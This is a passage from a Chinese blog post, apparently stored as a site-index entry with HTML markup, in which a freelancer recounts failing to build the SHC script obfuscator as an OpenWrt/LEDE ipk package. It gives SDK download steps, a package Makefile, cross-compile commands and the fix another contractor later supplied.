这个千万不要，这两条命令是把所有的库和软件都给下载下来的，如果再编译，基本半天过去了，浪费时间生命。我们的目标只是要编译个shc，其他都不管。\n第二点就是那个Makefile，其实编译shc就一句话，但是我们要放到LEDE里就必须有这个Makefile.\n这样就顺利编译出来个shc3.8.9baarch64_armv8-a.ipk，但是雇主反映拷上去不能用，我去！\n这才又仔细研究shc，这个软件其实是个混淆的软件，把shell脚本变成*.c，然后再用gcc编译成2进制文件。\n但是依OpenWRT的性格，一般根本装不下gcc的，所以必须外挂U盘装GCC上去，装法如下：\nhttp://www.th7.cn/Program/cp/201708/1224085.shtml\n验证方法也比较古怪，首先写好shell，然后跑到openwrt上用shc进行混淆，然后把混淆过的.c文件拷出来，再用gcc编译成bin，然后再拷回openwrt运行验证。\n再附上单独用gcc编译的方法：\nexport STAGING_DIR=~/LEDE-IPQ40XX$/staging_dir cd ~/LEDE-IPQ40XX$ ./staging_dir/toolchain-arm_cortex-a7+neon-vfpv4_gcc-7.3.0_musl_eabi/bin/arm-openwrt-linux-muslgnueabi-gcc script.sh.x.c -o script.sh.x shit啊，其实我编译出来的shc已经是可以运行并混淆出*.c的，但是不知道为什么arm-gcc编译出的bin文件在openwrt上无法运行，更悲剧的是我没有他那个平台，无法自己装个gcc看看到底是怎么回事\n悲惨世界啊，被扣了10$手续费。\n最后问了雇主，他又找了一个家伙解决了问题，给出的方法如下：\n9. Compile shell script ${HOME}/shc.sh -r ${HOME}/openwrt-sdk -n hello-world -s ${HOME}/hello-world.sh.x.c; ls -lh ${HOME}/openwrt-sdk/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_*; ls -lh ${HOME}/openwrt-sdk/build_dir/target-arm_cortex-a7+neon-vfpv4_musl_eabi/hello-world-0.0.1/hello-world; 10. Install the script package on OpenWrt. scp ${HOME}/openwrt/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_* root@192.168.1.1:/tmp/; ssh root@192.168.1.1; opkg install /tmp/script_*; exit; 看明白了吧，我也无法验证，靠有心人去试试了。记录一下。\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_6/","summary":"\u003cp\u003e这是一次失败的任务，即使再来一次，依然会失败，因为无法验证，真够shit的，扣了我10$的手续费。\u003c/p\u003e\n\u003cp\u003e记录一下，以儆效尤。\u003c/p\u003e\n\u003cp\u003e任务如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJob would be to compile an ipk file of SHC that would work with LEDE OS \u003cspan class=\"o\"\u003e(\u003c/span\u003eopenwrt\u003cspan class=\"o\"\u003e)\u003c/span\u003e and the processor used in our system - will provide details\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI think you must have a \u003cspan class=\"m\"\u003e64\u003c/span\u003e bit system to use the SDK to compile the file  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e翻译一下：在OpenWRT平台下编译一个SHC，并且能工作。\u003c/p\u003e\n\u003cp\u003e完全步骤如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHow to compile SHC on LEDE:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTested build environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOS: Ubuntu 14.04.5 LTS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU: ARMv7 Processor rev \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ev7l\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBefore you begin, check your system is updated, i.e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get upgrade  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get autoremove\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStep-by-step manual:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNote: perform all steps as regular \u003cspan class=\"o\"\u003e(\u003c/span\u003enon-root\u003cspan class=\"o\"\u003e)\u003c/span\u003e user. User must be in sudo group.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1. Update your sources\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2. Install nesessary packages:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3. Get latest LEDE \u003cspan class=\"nb\"\u003esource\u003c/span\u003e from git repository  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e4. No Need to Update and install all LEDE packages  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   We just want to compile shc, not other packages , so don\u003cspan class=\"s1\"\u003e\u0026#39;t update.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e5. Run \u0026#39;\u003c/span\u003emake menuconfig\u003cspan class=\"s1\"\u003e\u0026#39; (Just Save and Exit)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e6. Get SHC sources to LEDE package tree  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e (we are and shc-3.8.9b.tgz is in source directory)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ewget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003emkdir -p package/shc/src  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003etar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e7. Make ipk Makefile\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003evi package/shc/Makefile  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e##############################################\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# OpenWrt Makefile for shc program\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Most of the variables used here are defined in\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# the include directives below. We just need to \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# specify a basic description of the package, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# where to build our program, where to find \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# the source files, and where to install the \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# compiled program on the router. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Be very careful of spacing in this file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Indents should be tabs, not spaces, and \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# there should be no trailing whitespace in\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# lines that are not commented.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e##############################################\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einclude $(TOPDIR)/rules.mk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Name and release number of this package\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_NAME:=shc  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_VERSION:=3.8.9b  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_MAINTAINER:=Francisco, Rosales, \u0026lt;frosal@fi.upm.es\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# This specifies the directory where we\u0026#39;\u003c/span\u003ere going to build the program.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# The root build directory, $(BUILD_DIR), is by default the build_mipsel \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# directory in your OpenWrt SDK directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePKG_BUILD_DIR :\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003e$(\u003c/span\u003eBUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einclude \u003cspan class=\"k\"\u003e$(\u003c/span\u003eINCLUDE_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e/package.mk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify package information for this program. \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# The variables defined here should be self explanatory.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If you are running Kamikaze, delete the DESCRIPTION \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# variable below and uncomment the Kamikaze define\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# directive for the description below\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefine Package/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    SECTION:\u003cspan class=\"o\"\u003e=\u003c/span\u003eutils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    CATEGORY:\u003cspan class=\"o\"\u003e=\u003c/span\u003eUtilities\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    TITLE:\u003cspan class=\"o\"\u003e=\u003c/span\u003e shc ---- This tool generates a stripped binary executable version of the script specified at \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e line.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    URL:\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://www.datsi.fi.upm.es/~frosal\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Uncomment portion below for Kamikaze and delete DESCRIPTION variable above\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefine Package/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e/description  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    shc ---- This tool generates a stripped binary executable version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        of the script specified at \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e line.\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# Specify what needs to be done to prepare for building the package.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# In our case, we need to copy the source files to the build directory.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# This is NOT the default.  The default uses the PKG_SOURCE_URL and the\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# PKG_SOURCE which is not defined here to download the source from the web.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# In order to just build a simple program that we have just written, it is\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# much easier to do it this way.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003edefine Build/Prepare  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    mkdir -p \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eCP\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e ./src/* \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# We do not need to define Build/Configure or Build/Compile directives\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# The defaults are appropriate for compiling a simple program such as this one\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# Specify where and how to install the program. Since we only have one file, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# the helloworld executable, install it by copying it to the /bin directory on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# the router. The \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e variable represents the root directory on the router running \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# OpenWrt. The \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e variable contains a command to prepare the install \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# directory if it does not already exist.  Likewise \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_BIN\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e contains the \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# command to copy the binary file from its current location (in our case the build\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# directory) to the install directory.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003edefine Package/\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/install  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/bin\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_BIN\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/shc \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/bin/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 